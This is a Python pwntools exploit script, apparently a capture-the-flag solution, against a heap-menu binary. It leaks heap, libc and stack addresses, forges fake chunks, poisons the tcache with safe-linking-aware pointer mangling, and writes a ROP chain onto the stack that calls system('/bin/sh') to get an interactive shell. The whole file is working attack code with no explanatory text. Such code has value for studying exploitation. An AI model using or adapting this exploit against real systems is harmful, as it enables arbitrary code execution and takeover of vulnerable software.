from pwn import *
from time import sleep

BEDUG = True

io = 0

def add(size, dat):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'chunk size: ', str(size).encode('utf-8'))
    io.sendafter(b'chunk data: ', dat)

def rm(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'chunk id: ', str(idx).encode('utf-8'))

def c(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'chunk id: ', str(idx).encode('utf-8'))

def brute():
    global io
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    while 1:
        badluck = 0
        if BEDUG:
            io = process('./main')
            #gdb.attach(io)
        else:
            io = remote()
        add(0x28, b'OK') #0
        rm(0)
        add(0x28, b'\x00') #1
        c(1)
        heap = u64(io.recv(5).ljust(8, b'\0')) << 12
        fake_chunk = heap + 0x3e0
        target_chunk = fake_chunk + 0x40
        add(0x28, b'ok') #2
        add(0x28, b'ok') #3
        rm(2)
        rm(3)
        add(0x18, p64(10)+p64(1)+p64(fake_chunk)) #4
        add(0x48, p64(0)*5+p64(0x61)) #5
        add(0x48, p64(0)*3+p64(0x21)) #6
        for i in range(8):
            add(0x60, b'ok') # 7 8 9 10 11 12 13 14
        c(2)
        if (io.recvuntil(b'[-] failed to write from buffer', timeout=0.3) != b''):
            if BEDUG:
                io.kill()
            else:
                io.close()
            print('Badluck')
        else:
            try:
                rm(2)
            except:
                badluck = 1
                log.info('False positive at '+hex(heap)+'...')
                if BEDUG:
                    io.kill()
                else:
                    io.close()
            if badluck==0:
                break
    print('ok')
    try:
        add(0x58, p64(0)*3+p64(0x21)+p64(0x438)+p64(1)+p64(target_chunk)+p64(0x441)) #15
    except:
        print('wtf...? try again')
        exit(0)
    rm(6)
    c(15)
    io.recv(64)
    libc.address = u64(io.recv(6).ljust(8, b'\0')) - 0x219ce0
    log.info('Libc: '+hex(libc.address))
    add(0x38, p64(0)*3+p64(0x21)) # 16
    rm(15)
    add(0x58, p64(0)*3+p64(0x21)+p64(0x10)+p64(1)+p64(libc.sym['environ'])) #17
    c(16)
    stack = u64(io.recv(6).ljust(8, b'\0'))
    log.info('Stack: '+hex(stack))
    rm(17)
    add(0x58, p64(0)*3+p64(0x21)+p64(0x10)+p64(1)+p64(target_chunk)) #18
    add(0x38, b'ok') #19
    rm(19)
    rm(16)
    rm(18)
    log.info('Heap: '+hex(heap))
    add(0x58, p64(0)*3+p64(0x21)+p64((heap+0x200)^((heap+0x10) >> 12))+p64(0)+p64(0)+p64(0x41)+p64((stack-0x128) ^ ((heap+0x10) >> 12))) #20
    add(0x38, b'ok')
    add(0x38, p64(1)+p64(libc.address+0xbab79)+p64(libc.address+0x2a3e5)+p64(next(libc.search(b'/bin/sh')))+p64(libc.sym['system']))


brute()
gdb.attach(io)
io.interactive()
